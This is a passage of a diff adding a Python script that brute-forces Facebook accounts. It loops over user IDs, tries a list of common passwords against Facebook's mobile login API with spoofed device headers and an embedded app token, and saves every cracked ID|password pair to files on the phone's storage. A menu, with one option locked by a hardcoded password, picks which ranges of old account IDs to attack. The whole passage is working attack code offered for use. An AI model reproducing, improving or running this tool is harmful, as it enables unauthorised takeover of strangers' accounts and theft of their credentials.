+                print(f"\r\r\x1b[1;37m>\x1b[38;5;196m👑\x1b[1;37m<\x1b[38;5;196m(\x1b[1;37mRAJA VAU\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;220m{creationyear(uid)}")
+                open('/sdcard/RAJA-OLD-M1-OK.txt', 'a').write(f"{uid}|{pw}\n")
+                oks.append(uid)
+                break
+            elif 'www.facebook.com' in res.get('error', {}).get('message', ''):
+                print(f"\r\r\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mRAJA VAU\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;220m{creationyear(uid)}")
+                open('/sdcard/RAJA-OLD-M1-OK.txt', 'a').write(f"{uid}|{pw}\n")
+                oks.append(uid)
+                break
+        loop += 1
+    except Exception:
+        time.sleep(5)
+
+def login_2(uid):
+    global loop
+    session = requests.session()
+    try:
+        sys.stdout.write(f"\r\r\x1b[1;37m\x1b[38;5;196m+\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mRAJA-M2\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[38;5;192m{loop}\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mOK\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[38;5;192m{len(oks)}\x1b[38;5;196m)")
+        sys.stdout.flush()
+        for pw in ('123456','123123', '1234567890', '112233', '102030', '1234567', '12345678', '123456789'):
+            data = {
+                'adid': str(uuid.uuid4()),
+                'format': 'json',
+                'device_id': str(uuid.uuid4()),
+                'cpl': 'true',
+                'family_device_id': str(uuid.uuid4()),
+                'credentials_type': 'device_based_login_password',
+                'error_detail_type': 'button_with_disabled',
+                'source': 'device_based_login',
+                'email': str(uid),
+                'password': str(pw),
+                'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
+                'generate_session_cookies': '1',
+                'meta_inf_fbmeta': '',
+                'advertiser_id': str(uuid.uuid4()),
+                'currently_logged_in_userid': '0',
+                'locale': 'en_US',
+                'client_country_code': 'US',
+                'method': 'auth.login',
+                'fb_api_req_friendly_name': 'authenticate',
+                'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
+                'api_key': '882a8490361da98702bf97a021ddc14d'
+            }
+            headers = {
+                'User-Agent': window1(),
+                'Content-Type': 'application/x-www-form-urlencoded',
+                'Host': 'graph.facebook.com',
+                'X-FB-Net-HNI': '25227',
+                'X-FB-SIM-HNI': '29752',
+                'X-FB-Connection-Type': 'MOBILE.LTE',
+                'X-Tigon-Is-Retry': 'False',
+                'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;',
+                'x-fb-device-group': '5120',
+                'X-FB-Friendly-Name': 'ViewerReactionsMutation',
+                'X-FB-Request-Analytics-Tags': 'graphservice',
+                'X-FB-HTTP-Engine': 'Liger',
+                'X-FB-Client-IP': 'True',
+                'X-FB-Server-Cluster': 'True',
+                'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'
+            }
+            res = session.post('https://b-graph.facebook.com/auth/login', data=data, headers=headers, allow_redirects=False).json()
+            if 'session_key' in res:
+                print(f"\r\r\x1b[1;37m>\x1b[38;5;196m👑\x1b[1;37m<\x1b[38;5;196m(\x1b[1;37mRAJA VAU✔️\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;220m{creationyear(uid)}")
+                open('/sdcard/RAJA-OLD-M2-OK.txt', 'a').write(f"{uid}|{pw}\n")
+                oks.append(uid)
+                break
+            elif 'www.facebook.com' in res.get('error', {}).get('message', ''):
+                print(f"\r\r\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mRAJA VAU✔️\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;220m{creationyear(uid)}")
+                open('/sdcard/RAJA-OLD-M2-OK.txt', 'a').write(f"{uid}|{pw}\n")
+                oks.append(uid)
+                break
+        loop += 2
+    except Exception:
+        time.sleep(5)
+
+def main_menu():
+    approval_system()
+    while True:
+        banner()
+        width = max(get_width(), 40)
+        padding = " " * max(0, (width - 44) // 2)
+        
+        print(f"{padding}\033[1;36m╔════════════════════════════════════════════╗\033[0m")
+        print(f"{padding}\033[1;36m║ \033[1;32m[1] \033[1;33m---> \033[1;37mALL SERIES                      \033[1;36m║\033[0m")
+        print(f"{padding}\033[1;36m║ \033[1;32m[2] \033[1;33m---> \033[1;37m100003/4 SERIES                 \033[1;36m║\033[0m")
+        print(f"{padding}\033[1;36m║ \033[1;32m[3] \033[1;33m---> \033[1;37m2009 SERIES                     \033[1;36m║\033[0m")
+        print(f"{padding}\033[1;36m║ \033[1;31m[0] \033[1;33m---> \033[1;37mBACK / EXIT                     \033[1;36m║\033[0m")
+        print(f"{padding}\033[1;36m╚════════════════════════════════════════════╝\033[0m")
+        
+        choice = input(f"{padding}\033[1;33m [-] CHOOSE ---> \033[0m")
+        if choice == '1':
+            old_One()
+        elif choice == '2':
+            print(f"\n{padding}\033[1;33m [!] Option 2 is Password Protected!\033[0m")
+            password = input(f"{padding}\033[1;33m [-] ENTER PASSWORD ---> \033[0m")
+            if password == 'Kamal2026':
+                print(f"{padding}\033[1;32m [+] Correct Password! Access Granted.\033[0m")
+                time.sleep(1.5)
+                old_Tow()
+            else:
+                print(f"{padding}\033[1;31m [!] Incorrect Password! Access Denied.\033[0m")
+                time.sleep(2)
+        elif choice == '3':
+            old_Tree()
+        elif choice == '0':
+            print(f"{padding}\n\033[1;31m [!] Exiting...\033[0m")
+            break
+        else:
+            print(f"{padding}\n\033[1;31m [!] Invalid Choice!\033[0m")
+            time.sleep(1)
+
+if __name__ == '__main__':
+    main_menu()
